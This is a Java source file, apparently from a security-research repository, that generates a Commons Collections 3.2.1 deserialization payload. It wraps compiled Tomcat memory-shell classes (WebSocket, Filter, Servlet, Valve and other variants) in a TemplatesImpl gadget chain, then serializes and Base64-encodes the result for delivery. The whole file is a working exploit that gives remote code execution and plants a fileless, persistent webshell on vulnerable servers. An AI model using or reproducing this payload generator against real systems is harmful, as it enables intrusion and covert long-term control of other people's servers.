package org.example.tomcatmemshell;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

//CC3.2.1
public class CC3TemplatesImpl {
    public static void main(String[] args) throws Exception {
//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/servlet/ServletMemShell.class"));
//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Generic/GenericTomcatMemShell4.class"));
//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Filter/FilterMemShell.class"));
//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/JNI/JNIMemShell.class"));
//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Listener/ListenerMemShell.class"));
//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Valve/ValveMemShell2.class"));
//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Upgrade/UpgradeMemShell.class"));
//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Executor/ExecutorMemShell.class"));//Executor马复现失败，局限较大
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/WebSocket/WebSocketMemShell.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templatesClass),
                new InvokerTransformer("newTransformer",new Class[]{},new Object[]{}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        map.remove("test1");
        Class lazymapClass = lazyMap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, chainedTransformer);
        serialize(hashMap);
        System.out.println(readClassStr());
//        unserialize("cc6.ser");
    }
    public static String readClassStr() throws IOException {
        byte[] code = Files.readAllBytes(Paths.get("cc6.ser"));
        String encodeString = new String(Base64.getEncoder().encode(code));
        byte[] bytes= Base64.getDecoder().decode(encodeString);
        return encodeString;}
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
